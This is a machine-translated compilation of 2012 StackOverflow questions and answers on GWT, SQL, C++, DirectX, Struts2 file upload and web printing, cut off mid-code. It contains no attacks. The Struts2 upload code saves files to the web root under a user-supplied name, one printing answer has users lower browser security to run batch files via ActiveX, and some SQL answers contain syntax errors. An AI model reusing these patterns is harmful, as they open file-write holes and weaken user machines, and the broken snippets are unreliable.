# StackOverflow 问答 13343000-13343999

# gwt - 如何在 GWT 的网格中添加单选按钮？

> ID：13343000
> 
> 赞同：0
> 
> 时间：2012-11-12T11:36:25.020
> 
> 标签：gwt, radio-button, gxt

我的面板中有一个网格。我想在网格上添加 Radio 作为列，但不太确定如何操作。请告诉我如何配置单选按钮列。

我试图在谷歌搜索，但没有找到解决方案。任何帮助表示赞赏:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T13:24:06.447

You can build a custom cell that renders as

```
<input type="radio" name="group" value="" /> 
```

This is a tutorial on building custom cells:

[https://developers.google.com/web-toolkit/doc/latest/DevGuideUiCustomCells](https://developers.google.com/web-toolkit/doc/latest/DevGuideUiCustomCells)

# visual-studio-2010 - 如何修复安装项目先决条件警告

> ID：13343006
> 
> 赞同：1
> 
> 时间：2012-11-12T11:36:59.190
> 
> 标签：visual-studio-2010, windows-8, setup-project, prerequisites

当我转到 Visual Studio 安装项目中的“设置属性页”并查看先决条件时，我看到一条警告：

> 找不到引导的先决条件

我做了以下事情：

1.  在我的包中添加了一个新文件夹：“C:\Program Files (x86)\Microsoft SDKs\Windows\v7.0A\Bootstrapper\Packages”
2.  重启VS2010
3.  （甚至重新启动了我的电脑）

该包裹上仍然可以看到警告。接下来，我在 Packages 目录中添加了一个 .VSBootstrapperManifest 文件（ C:\Program Files (x86)\Microsoft SDKs\Windows\v7.0A\Bootstrapper\Packages ）

再次重新启动VS2010，但这也没有帮助，与重新启动相同。

有什么建议可能是错的吗？这适用于我的 Win7 x64 机器，但这似乎不再适用于我的 Win8 Pro x64。

提前致谢。

**更新：**

当我从我的包中打开 Product.xml 文件时，我看到这些 XML 行：

```
 <InstallChecks>
    <RegistryCheck Property="FoxProOleDbInstalled" Key="HKCR\CLSID\{...-..-..}\InprocServer32" />
  </InstallChecks> 
```

当我在注册表中搜索该键 {...-..-..} 时，我在 HKCR\CLSID{...-..-..} 位置找不到它，但我可以在这个位置找到它：

HKEY_CLASSES_ROOT\ **Wow6432Node** \CLSID\ {...-..-..}

我可以在 Product.xml 的 InstallChecks-tag 中添加另一行吗？如何在该文件中检查 RegistryCheck 标记（AND？OR？）（我认为所有 InstallChecks 都必须为真，但我不确定，文档不是很清楚：http: [//msdn.microsoft.com/en -us/library/ms229432(v=vs.80).aspx](http://msdn.microsoft.com/en-us/library/ms229432(v=vs.80).aspx) )

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-01T20:39:43.940

如果您正在“windows 8 pro”中开发 Windows 8 商店/地铁应用程序。使用 Visual Studio 2012 而不是 vs2010。它会工作。

# php - 按查询sql分组

> ID：13343008
> 
> 赞同：0
> 
> 时间：2012-11-12T11:37:11.187
> 
> 标签：php, mysql, sql

我想计算警报的数量和用户处理的警报数量，键入 type = C 和 M 我从这个查询开始，它给了我正确的主要和关键警报的数量，但我被处理的警报数量卡住了

```
SELECT 
  TYPE,
  user_name,
  COUNT(type_alertes) AS nb, 
  id_user,
  SUM(CASE WHEN TYPE ='C' THEN 1 ELSE 0 END) AS critique,
  SUM(CASE WHEN TYPE ='M' THEN 1 ELSE 0 END) AS majeur 
FROM stat_alert  
 LEFT OUTER JOIN user_qdf ON user_qdf.`id` = id_user 
WHERE 
  user_qdf.`id`=id_user 
  AND TYPE IN ('M', 'C')
GROUP BY id_user 
```

谁能帮我

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T12:00:11.520

If you want number of all alerts and from that number of C and number of M then

```
SELECT 
  user_name,
  COUNT(type_alertes) AS nb, 
  id_user,
  SUM(CASE WHEN TYPE ='C' THEN 1 ELSE 0 END) AS critique,
  SUM(CASE WHEN TYPE ='M' THEN 1 ELSE 0 END) AS majeur 
FROM stat_alert  
 JOIN user_qdf ON user_qdf.`id` = id_user 
GROUP BY id_user, user_name 
```

should do that. I assume that user_name is from user_qdf table and other are from stat_alert and id_user is not null.

EDIT: For sum of alertes

```
SELECT 
  user_name,
  COUNT(type_alertes) AS nb, 
  id_user,
  SUM(CASE WHEN TYPE ='C' THEN 1 ELSE 0 END) AS critique,
  SUM(CASE WHEN TYPE ='M' THEN 1 ELSE 0 END) AS majeur 
  SUM(CASE WHEN TYPE ='M' OR TYPE = 'C' THEN 1 ELSE 0 END) AS both_c_and_m
FROM stat_alert  
 JOIN user_qdf ON user_qdf.`id` = id_user 
GROUP BY id_user, user_name 
```

EDIT2:

```
SELECT 
  user_name,
  COUNT(type_alertes) AS nb, 
  SUM(CASE WHEN TYPE ='C' THEN type_alertes ELSE 0 END) AS critique_alerts,
  SUM(CASE WHEN TYPE ='M' THEN type_alertes ELSE 0 END) AS majeur_alertes
  id_user,
  SUM(CASE WHEN TYPE ='C' THEN 1 ELSE 0 END) AS critique,
  SUM(CASE WHEN TYPE ='M' THEN 1 ELSE 0 END) AS majeur 
FROM stat_alert  
 JOIN user_qdf ON user_qdf.`id` = id_user 
WHERE TYPE in ('C','M')
GROUP BY id_user, user_name 
```

is that what you want?

# web-services - 使用 C# 4.0 和动态对象，如何创建 Web 服务的动态代理？

> ID：13343010
> 
> 赞同：1
> 
> 时间：2012-11-12T11:37:12.900
> 
> 标签：web-services, c#-4.0, dynamic, soap, wsdl

我正在尝试确定是否可以为 Web 服务 (SOAP) 创建一个动态（如使用 C# 4.0 的动态对象功能）代理。

基本上，我想给动态对象一个 WSDL 的 URL，然后它会使用它来构造代理。然后就可以使用任何参数调用任何 Web 方法。

我特别不想使用 Visual Studio 的代理生成，因为这是静态的。

我在网上搜索了一下，但我唯一能找到的是一个用于 C# 2.0 的旧库，通过动态创建程序集来创建动态代理：[http ://www.thinktecture.com/resourcearchive/tools-and-software/dynwslib](http://www.thinktecture.com/resourcearchive/tools-and-software/dynwslib)

还有更多：http: [//blogs.msdn.com/b/kaevans/archive/2006/04/27/dynamically-invoking-a-web-service.aspx](http://blogs.msdn.com/b/kaevans/archive/2006/04/27/dynamically-invoking-a-web-service.aspx)

# c++ - C++ 将字符串转换为 char 数组

> ID：13343013
> 
> 赞同：3
> 
> 时间：2012-11-12T11:37:30.437
> 
> 标签：c++, string, character-arrays

我想有 2 个字符串作为输入，这样我就可以使用`getline(cin,s)`（所以我可以选择整行直到`'\n'`）然后我想搜索第二个数组，如果它包含第一个数组的单词而不使用`string::find()`or `strstr()`。但我仍然找不到将字符串转换为数组的方法

```
int main()
{
    string s;
    string s2;
    char array[50];
    char array2[50];

    cout<<"Give me the first word"<<endl;
    getline(cin,s);

    cout<<"Give me the text"<<endl;
    getline(cin.s2);

    array=s;
    array2=s2;
} 
```

我想的第二种方法是从一开始就使用数组来完成这项工作：

```
char array[50];
cin.getline(array,50); 
```

但是，如果我使用直接数组，有什么方法可以像在字符串上一样找到数组的长度吗？

```
//example
string s;
int x;

getline(cin,s);
x=line.length(); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T11:40:14.980

只是不要这样做，因为你*不需*要这样做。

您可以使用该[`c_str()`](http://en.cppreference.com/w/cpp/string/basic_string/c_str)函数将 转换`std::string`为 char 数组，但在您的情况下，这只是不必要的。对于查找元素的情况（我相信这是您需要的），您可以使用字符串`operator[]`并将其视为普通数组。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-12T11:39:07.563

您可以使用and函数[`c_str`](http://www.cplusplus.com/reference/string/string/c_str/)的成员将数据复制到数组中：`std::string`[`strcpy`](http://www.cplusplus.com/reference/clibrary/cstring/strcpy/)

```
//array=s;
strcpy(array, s.c_str());
//array2=s2;
strcpy(array2, s2.c_str()); 
```

但是，除非您必须传递非常量数组，否则您不必这样做`char`，因为`std::string`s 看起来和感觉很像字符数组，只是它们更灵活。与字符数组不同，字符串会根据需要增长到合适的大小，提供安全搜索和操作的方法等等。

# c# - DirectX / SharpDX中的“glReadPixels”等功能

> ID：13343020
> 
> 赞同：6
> 
> 时间：2012-11-12T11:37:57.877
> 
> 标签：c#, opengl, directx, sharpdx

我正在寻找一种在鼠标点读取像素颜色的方法。在 OpenGL 中，它是通过在绘制场景（或部分场景）后调用函数“glReadPixels”来完成的。我想在背景中做一个简单的颜色选择例程，用于识别 3D 空间中的形状/线条。

那么，在 SharpDX (DirectX10 / DirectX11) 中是否有任何等效的方法/功能/建议可以做同样的事情？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-12T15:06:44.720

Direct3D11 完全可以做到这一点：只需按照以下步骤操作：

*   使用[DeviceContext.CopySubResourceRegion](http://msdn.microsoft.com/en-us/library/windows/desktop/ff476394%28v=vs.85%29.aspx)将部分从源纹理复制到暂存纹理（要回读的像素区域的大小，格式相同，但使用 ResourceUsage.Staging）
*   使用 Device.Map/UnMap 从这个暂存纹理​​中检索像素。

网上有很多关于这个话题的讨论（例如：“[在DX11中从纹理读取一个像素到CPU](http://www.gamedev.net/topic/594722-reading-one-pixel-from-texture-to-cpu-in-dx11/) ”）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T06:42:18.170

另一种选择是使用小型计算着色器，例如：

```
Texture2D<float4> TextureInput: register(t0);
StructuredBuffer<float2> UVBuffer: register(t1);
RWStructuredBuffer<float4> RWColorBuffer : register(u0);

SamplerState Sampler : register( s0 );

[numthreads(1, 1, 1)]
void CSGetPixels( uint3 DTid : SV_DispatchThreadID )
{ 
float4 c = TextureInput.SampleLevel(Sampler , UVBuffer[DTid.x].xy, 0);
RWColorBuffer [DTid.x] = c;
} 
```

它为您提供了更多“格式不可知论”的优势。

过程就是这样。

*   为 UV (float2) 创建一个小的结构化缓冲区（像素位置/纹理大小，当然不要忘记翻转 Y 轴）。将要采样的像素位置复制到此缓冲区中。
*   创建一个可写缓冲区和一个暂存缓冲区 (float4)。需要与您的 uv 缓冲区相同的元素计数。
*   全部绑定并调度
*   将可写缓冲区复制到暂存缓冲区。
*   在 cpu 中映射和读取 float4 数据

请注意，为简单起见，我省略了计算着色器中的线程组优化/检查。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-12T12:36:38.510

由于您使用的是 C#，我的建议是使用 GDI+，因为 DX 中没有像“glReadPixels”这样的功能。GDI+ 提供了非常简单的方法来读取鼠标指针处的像素颜色。请参阅[stackoverflow.com/questions/1483928](https://stackoverflow.com/questions/1483928/how-to-read-the-color-of-a-screen-pixel)。

如果 GDI+ 不行，因为它不是很快，你不能坚持使用“Ray”来拾取通常的对象吗？您想识别（我想是 3 维的）形状/线条，这很容易使用射线（并检查交叉点）来挑选它们。

# command-line - 获取 MKS 项目的所有变更包的列表

> ID：13343022
> 
> 赞同：1
> 
> 时间：2012-11-12T11:38:01.700
> 
> 标签：command-line, automation, revision-history, mks, mks-integrity

我正在尝试通过命令行自动化 MKS Integrity 的一些任务。由于我们被迫使用变更包功能，我尝试获取单个 MKS 项目的所有变更包的列表。如何做到这一点？

我已经检查了“si”和“im”的命令行引用，但我仍然不知道如何获得这样的列表。我已经开始工作的唯一一件事是来自“si rlog”的更改包列表。在这里，我可以解析输出并删除所有重复的条目。但问题是，我只能从项目中当前可用的文件中获取更改包。不包括影响已删除文件的更改包。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T21:55:05.340

要按项目查找变更包，请使用以下命令：

**si viewcps --filter=project:"c:/path_to_project/project.pj"**

请注意，斜线是向前的，而不是像 Windows 使用的那样向后。

还有不同的字段和格式可用，而不仅仅是默认字段和格式。如果您在命令提示符下运行**man "si viewcps"**，它将为您提供一个字段列表，您可以使用可选的 --fields 标记来输出附加信息。

可以修改输出以将结果限制为 CP 类型、状态、目标等。**man "si viewcps"**还提供了有关如何使用这些选项的详细信息。

# java - 如何在构造函数中创建唯一的字母和数字序列

> ID：13343026
> 
> 赞同：4
> 
> 时间：2012-11-12T11:38:10.507
> 
> 标签：java, constructor, field, content-length, bluej

我有一个字段调用详细信息，其中包含不同的字母和数字序列，我想做的是一个构造函数，它具有长度为 8 的唯一字母和数字序列。

# c# - 使用 func<> 将 int 返回到数据库连接器

> ID：13343041
> 
> 赞同：0
> 
> 时间：2012-11-12T11:38:55.097
> 
> 标签：c#

我试图根据传入的对象类型（在本例中为实体）返回一个整数参数，但不确定格式。请问有什么帮助吗？

```
entity.ID = db.Create(
                    entity.Name,
                    entity.Description,
                    entity.InitialStep != null ? (int?)entity.InitialStep.ID : null,
                    entity.IsPrivate,
                    entity.AllowOnBehalfSubmission,
                    new Func<int>{something needs to happen here and return an integer}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T11:50:14.240

您可以通过以下几种方法指定返回 int 的函数：

1) 指定现有方法

```
 private int MethodReturningInt() { return 1; }

    db.Create( /* ... */
             MethodReturningInt);  // note: no () ! 
```

2）使用委托（匿名方法）

```
 db.Create( /* ... */
      delegate() { return 1; }); 
```

3) 使用 lambda 表达式

```
 db.Create(/* ... */
      () => 1); 
```

现在您仍然需要根据您的需要调整返回值 (1) ...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T11:58:44.097

您尝试调用的 lambda 函数需要在与定义相同的上下文中执行。据我了解，您的对象（实体）可以有多种类型，您想根据对象类型设置参数值吗？如果是这样，请按照以下几行修改您的代码：

```
entity.ID = db.Create(
    entity.Name,
    entity.Description,
    entity.InitialStep != null ? (int?)entity.InitialStep.ID : null,
    entity.IsPrivate,
    entity.AllowOnBehalfSubmission,
    new Func<Type, int?> (type => 
    {
        if (type == typeof(SomeType))
            return 1;
        if (type == typeof(AnotherType))
            return 2;
        return null;
    })(entity.GetType())
); 
```

# struts2 - 使用struts2上传图片

> ID：13343043
> 
> 赞同：-1
> 
> 时间：2012-11-12T11:39:00.073
> 
> 标签：struts2

我想使用 struts2 使用函数 copyFile() 上传图像，但是当我使用不支持的 ServletRequestAware 时会引发异常。请帮我解决这个问题。这是我的代码

索引.jsp

```
<%@ taglib prefix="s" uri="/struts-tags"%>
<html>
    <body>
        <s:form action="uploadAction.action" method="post" enctype="multipart/form-data">>
            <s:textfield label="caption" name="caption"/>
            <input type="file" name="userImage"/>
            <s:submit name="submit" label="Submit"/>
        </s:form>
    </body>
</html> 
```

上传文件.xml

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE struts PUBLIC
"-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"
"http://struts.apache.org/dtds/struts-2.0.dtd">

<struts>
    <package name="attribute" extends="struts-default">
        <action name="uploadAction" class="com.scrolls.fileupload.action.UploadImageAction" method="uploadImage">
        <interceptor-ref name="fileUpload">
        <param name="maximumSize">2097152</param>
        <param name="allowedTypes">
        image/png,image/gif,image/jpeg,image/pjpeg
        </param>
        </interceptor-ref>
        <interceptor-ref name="defaultStack"></interceptor-ref>
            <result name="success">ImageUploadSuccess.jsp</result>
            <result name="input">index.jsp</result>
    </action>

    </package>
</struts> 
```

UploadImageAction.java

```
package com.scrolls.fileupload.action;

import com.opensymphony.xwork2.ActionSupport;
import java.io.File;
import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;
import org.apache.commons.io.FileUtils;
import org.apache.struts2.interceptor.ServletRequestAware;

public class UploadImageAction extends ActionSupport implements ServletRequestAware {
private File userImage;
private String userImageContentType;
private String caption;

private HttpServletRequest servletRequest;

    public String uploadImage() {
        try {
            HttpSession session = servletRequest.getSession();
            ServletContext context = session.getServletContext();
            String filePath = context.getRealPath("/");
            System.out.println("Server path:" + filePath);

            File fileToCreate = new File(filePath, this.caption);

            FileUtils.copyFile(this.userImage, fileToCreate);

            } 
        catch (Exception e) {
        System.out.println(e);
        return INPUT;
        }

        return SUCCESS;
    }

    public File getUserImage() {
        return userImage;
    }

    public void setUserImage(File userImage) {
        this.userImage = userImage;
    }

    public String getUserImageContentType() {
        return userImageContentType;
    }

    public void setUserImageContentType(String userImageContentType) {
        this.userImageContentType = userImageContentType;
    }

    public String getCaption() {
        return caption;
    }

    public void setCaption(String caption) {
        this.caption = caption;
    }

    @Override
    public void setServletRequest(HttpServletRequest hsr) {
        throw new UnsupportedOperationException("Not supported yet.");
    }
} 
```

ImageUploadSuccess.jsp

```
<%@ taglib prefix="s" uri="/struts-tags"%>
<html>
<body>
<h2>Struts2 Image Upload</h2>
<b>Image Uploaded To Folder :</b><s:property value="userImage"/>
<br/>
<b>Content Type:</b> <s:property value="userImageContentType"/>
<br/>
<b>Uploaded Image Name:</b> <s:property value="caption"/>
<br/>
<b>Uploaded Image Preview :</b>
<br/>
<img src="<s:property value="userImageFileName"/>"/>

</body>
</html> 
```

例外：

```
SEVERE: Servlet.service() for servlet [default] in context with path [/fileupload] threw exception [java.lang.UnsupportedOperationException: Not supported yet.] with root cause
java.lang.UnsupportedOperationException: Not supported yet.
    at com.scrolls.fileupload.action.UploadImageAction.setServletRequest(UploadImageAction.java:81)
    at org.apache.struts2.interceptor.ServletConfigInterceptor.intercept(ServletConfigInterceptor.java:131)
    at com.opensymphony.xwork2.DefaultActionInvocation$2.doProfiling(DefaultActionInvocation.java:224)
    at com.opensymphony.xwork2.DefaultActionInvocation$2.doProfiling(DefaultActionInvocation.java:223)
    at com.opensymphony.xwork2.util.profiling.UtilTimerStack.profile(UtilTimerStack.java:455)
    at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:221)
    at com.opensymphony.xwork2.interceptor.AliasInterceptor.intercept(AliasInterceptor.java:123)
    at com.opensymphony.xwork2.DefaultActionInvocation$2.doProfiling(DefaultActionInvocation.java:224)
    at com.opensymphony.xwork2.DefaultActionInvocation$2.doProfiling(DefaultActionInvocation.java:223)
    at com.opensymphony.xwork2.util.profiling.UtilTimerStack.profile(UtilTimerStack.java:455)
    at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:221)
    at com.opensymphony.xwork2.interceptor.ExceptionMappingInterceptor.intercept(ExceptionMappingInterceptor.java:176)
    at com.opensymphony.xwork2.DefaultActionInvocation$2.doProfiling(DefaultActionInvocation.java:224)
    at com.opensymphony.xwork2.DefaultActionInvocation$2.doProfiling(DefaultActionInvocation.java:223)
    at com.opensymphony.xwork2.util.profiling.UtilTimerStack.profile(UtilTimerStack.java:455)
    at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:221)
    at org.apache.struts2.interceptor.FileUploadInterceptor.intercept(FileUploadInterceptor.java:268)
    at com.opensymphony.xwork2.DefaultActionInvocation$2.doProfiling(DefaultActionInvocation.java:224)
    at com.opensymphony.xwork2.DefaultActionInvocation$2.doProfiling(DefaultActionInvocation.java:223)
    at com.opensymphony.xwork2.util.profiling.UtilTimerStack.profile(UtilTimerStack.java:455)
    at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:221)
    at org.apache.struts2.impl.StrutsActionProxy.execute(StrutsActionProxy.java:50)
    at org.apache.struts2.dispatcher.Dispatcher.serviceAction(Dispatcher.java:504)
    at org.apache.struts2.dispatcher.FilterDispatcher.doFilter(FilterDispatcher.java:419)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:224)
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:169)
    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168)
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:100)
    at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:929)
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:405)
    at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:964)
    at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:515)
    at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:302)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
    at java.lang.Thread.run(Thread.java:722) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T14:51:43.883

...*您正在*抛出该异常，正是堆栈跟踪*告诉*您的位置。

您不知道 Java 堆栈跟踪吗？您无法阅读它提供的信息吗？

*它指向**您的**代码。*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T11:56:11.823

First of all `defaultStack` already includes `fileUpload` interceptor so you have to configure that interceptor instead of adding it twice to your action interceptors stack.

```
<action name="uploadAction" class="com.scrolls.fileupload.action.UploadImageAction" method="uploadImage">
    <interceptor-ref name="defaultStack">
        <param name="fileUpload.maximumSize">2097152</param>
        <param name="fileUpload.allowedTypes">
             image/png,image/gif,image/jpeg,image/pjpeg
        </param>
    </interceptor-ref>
    <result name="success">ImageUploadSuccess.jsp</result>
    <result name="input">index.jsp</result>
</action> 
```

Second: in Struts2 you do not need to read submitted file from request. Read about file upload [http://struts.apache.org/2.x/docs/file-upload.html](http://struts.apache.org/2.x/docs/file-upload.html).

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-03-07T04:38:56.447

您可以尝试从此链接下载示例项目。

[http://javapostsforlearning.blogspot.com/2012/07/file-upload-in-struts-2.html](http://javapostsforlearning.blogspot.com/2012/07/file-upload-in-struts-2.html)

[我已经尝试过了，它可以工作。（感谢教程创建者）](http://javapostsforlearning.blogspot.com/2012/07/file-upload-in-struts-2.html)

# javascript - 如何在 Web 应用程序中实现打印

> ID：13343047
> 
> 赞同：2
> 
> 时间：2012-11-12T11:39:10.947
> 
> 标签：javascript, asp.net, vb.net, printing

在我的桌面应用程序中，我通过批处理文件开发了基于文本的报告和打印，因为打印是批量大小，有时我们必须限制打印单个副本，例如定期存款收据等。我们使用的是 lqdsi 5235 点阵打印机工作文件。目前桌面申请流程如下：

批处理文件是这样的：

批处理文件的名称：Dosprint.bat

```
Type %1 > prn 
```

对于网络打印：批处理文件的名称：Netprint.bat

```
Type %1 > \\SharedComputer\SharedPrinterName 
```

在应用程序中，我将打印重定向如下

```
Public Function printFile(ByVal mFileNamePath As String) As Boolean
Shell(Application.StartupPath & "\Printer\dosprint.bat " & mFileNamePath, AppWinStyle.Hide)
      Return True
End Function 
```

印刷价值非常高，有时要印刷数千张。它非常安全，我可以控制副本数量以及定期存款收据等所有内容。
如果有任何方法可以在 Web 应用程序中实现相同的流程，请帮助我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:05:33.753

如果您的意思是如何从 Web 应用程序运行批处理文件，您可以执行以下操作：

```
 System.Diagnostics.Process.Start(file.FullName) //where file is a FileInfo class 
```

只要您的 Web 应用程序可以访问该文件（例如位于 bin 文件夹中）并且

运行您的应用程序的帐户具有足够的权限来执行该文件。

***更新***：

处理打印场景的正确方法是创建一个页面，该页面以简单易用的方式呈现内容以进行打印。例如，使用一个简单的表格来列出数据，在大多数演示文稿中使用白色，以避免不必要地花费打印墨盒，在特定尺寸（如 A4 或 letter 等）中符合您的需求的图片。然后您可以在正文中调用此函数标签：

```
 <body onload="window.print();">
    <!--content specially designed for proper printing -->
 </body> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-12-19T06:54:47.013

感谢 SachinKumar K 先生在 WWW.CODEPROJECT.COM 上的文章 FILE HANDLING AT CLIENT SIDE USING JAVASCRIPT。在这篇文章中，他提到必须将网站添加到受信任的站点列表中，以便可以创建和运行 ActiveX 对象。

对于 dos 打印，我按照以下系统在客户端系统点阵打印机上从我的网站获取基于 dos 的打印。

1.  客户端系统上的配置：（Internet Explorer/浏览器配置）

    打开 Internet Explorer --> 工具 --> Internet 选项 -->安全（选项卡）。

    在受信任的站点中添加 SERVER URL

    注意：取消选中“此区域中所有站点的必需服务器验证 (https:)（如果您的网站不是 HTTPS）以允许添加该站点。

    接下来使用同一页面上的自定义级别选项卡启用 ActiveX 控件和插件

    //创建一个批处理文件，例如：printme.bat。并在批处理文件中键入以下命令。

    键入 %1 > prn

    //批处理文件只包含一个命令行如上。您可以将 prn 关键字更改为 LPT1 或共享打印机，如 \system_name\printer

    //如果需要，授予IIS_IUSRS，IUSR对文件夹的权限，该文件夹包含浏览器访问的printme.bat文件。

2.  网页标签定义和javascript实现：

// 使用 PRE 标签。它以未格式化的方式存储原始数据（ASCII）

```
<pre id="predata" runat="server" style="display:none;"></pre>

<asp:Button Text="Print Report" runat="server" ID="btnprint" Width="101px" CssClass="buttonstyle" BackColor="DarkSlateGray"  ForeColor="Aqua" OnClientClick="dosprint()" />

<%-- JAVA SCRIPT FOR PRINTING --%>
    <script>
        function dosprint () {
            var fso, tempfile,mdata;
            var fname = { key: 'value' };
            fso = new ActiveXObject("Scripting.FileSystemObject");
            function CreateTempFile(fname) {
                var tfolder, tfile, tname, fname, TemporaryFolder = 2;
                tfolder = fso.GetSpecialFolder(TemporaryFolder);
                tname = fso.GetTempName();
                fname.key = tfolder + '\\' + tname;
                tfile = tfolder.CreateTextFile(tname);
                return (tfile);
            }
            tempfile = CreateTempFile(fname);
            mdata = document.getElementById('<%= predata.ClientID %>').innerText;
            tempfile.writeline(mdata);
            tempfile.close();
            objShell = new ActiveXObject("WScript.Shell");
            comspec = objShell.ExpandEnvironmentStrings("%comspec%");
            objExec = objShell.Exec('c:\\temp\\printme.bat ' + fname.key); 
          // give double back slash to get a back slash in path
 }
 </script> 
```

在上面的代码中，PRINTME.BAT 批处理文件存在于客户端系统的 c:\temp 目录中。

上述系统对我有用。谢谢大家和快乐的编码。

# jquery - 获取父和第一个跨度子jQuery

> ID：13343049
> 
> 赞同：5
> 
> 时间：2012-11-12T11:39:17.560
> 
> 标签：jquery

我有这个结构：

```
<div class="list">
    <ul>
        <li>
            <span class="number">1</span>
            <p class="list-title"><a href="#">Welcome</a></p>
            <img src="images/like.png" class="like" />

            <div class="subcomments">
                <div class="comments">
                <ul>
                    <li>
                        <span class="number">2</span>
                        <img src="images/like.png" class="like" />
                    </li>
                </ul>
            </div>
        </div>
    </li>
</ul> 
```

我想当点击类“like”时出现span.number的内容，即去父亲那里获取带有类号的span的内容。

我正在尝试这个：

```
$('.like').parent().children('span:first').text() 
```

但是在这两种情况下总是给我 1，而不是在第一次喜欢时给 1，在第二次喜欢时给 2。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T11:42:01.920

你需要 jquery[**兄弟姐妹（）**](http://api.jquery.com/siblings/)，

**[现场演示](http://jsfiddle.net/QaQHA/1/)**

```
$('.like').siblings('span:first').text(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T11:40:44.390

你应该使用`this`

```
$(.link).click(function() {
   $(this).parent().find('.number').text();
   //  $(this).parent().find('span:first').text(); // same thing
   //  $(this).closest('.number').text();          // same thing
}) 
```

当你写的时候 `$('.link').parent().find('span:first').text()`；当你使用它时，它总是会采用第一`.link`类并采用它的跨度值，`this`它完全使用`.link`你点击的那个

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T11:41:59.277

使用[`.siblings()`](http://api.jquery.com/siblings/)：

```
$('.like').siblings('span:first').text(); 
```

这本身将始终显示 1 - 因为选择器`.like`返回 2 个元素 - 以下代码 ( `.siblings('span:first').text();`) 两次都针对第一个元素运行 - 您需要使用 each 来循环每个值：

```
$('.like').each(function() {
    alert($(this).siblings('span:first').text());
})​ 
```

[这里的例子](http://jsfiddle.net/NDb6h/)

# javascript - 通过继承的javascript私有变量

> ID：13343054
> 
> 赞同：2
> 
> 时间：2012-11-12T11:39:53.810
> 
> 标签：javascript, inheritance, private-members

我在使用 javascript 时遇到问题...
我想在一个不能从其子类中使用的类中声明一个私有变量...我尝试过的是：

```
function Person(){
    var _name
    this.setName = function(name){
        _name = name
    }
    this.getName = function(){
        return _name
    }
}

function GreetingPerson(){
    var self = this;
    self.sayHello = function(){
        console.log(self.getName() + ': "Hello!"');
    }
}

GreetingPerson.prototype = new Person()
GreetingPerson.prototype.contructor = GreetingPerson;

var manuel = new GreetingPerson()
manuel.setName('Manuel');
manuel.sayHello();

var world = new GreetingPerson()
world.setName('World');
world.sayHello();
manuel.sayHello();
console.log(manuel.name) 
```

这样**name**变量是 private 的，但它也是*static*，所以最后一个**sayHello**方法调用，将写入相同的输出。
我也尝试过以这种方式更改**Person**类：

```
function Person(){
    this.setName = function(name){
        this.name = name
    }
    this.getName = function(){
        return this.name
    }
} 
```

但通过这种方式，它不再是私有的。
实现它的正确方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T11:51:14.820

编辑：使用@teddybeard 说的类似的东西，你也可以得到它：

```
function Person(){
    var _name;
    this.setName = function(name){
        _name = name;
    };
    this.getName = function(){
        return _name;
    };
  return this;
}

function GreetingPerson(){
    Person.call(this);
    this.sayHello = function(){
        console.log(this.getName() + ': "Hello!"');
    };
  return this;
}

GreetingPerson.prototype = new Person();
GreetingPerson.prototype.constructor = GreetingPerson;

var manuel = new GreetingPerson();
manuel.setName('Manuel');
manuel.sayHello();

var world = new GreetingPerson();
world.setName('World');
world.sayHello();
manuel.sayHello();
console.log(manuel._name); 
```

但我不太确定这是否真的可以。`Person.call(this);`问题是，如果你不在构造函数中做类似的事情`GreetingPerson`，你将不会创建一个新的实例，`Person`并且它总是使用相同的`_name`值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T11:57:44.973

如果您有时间，请查看[Eloquent Javascript 。](http://eloquentjavascript.net/chapter8.html)我认为这段代码应该适用于您的继承目的。

```
function Person() {
    var _name
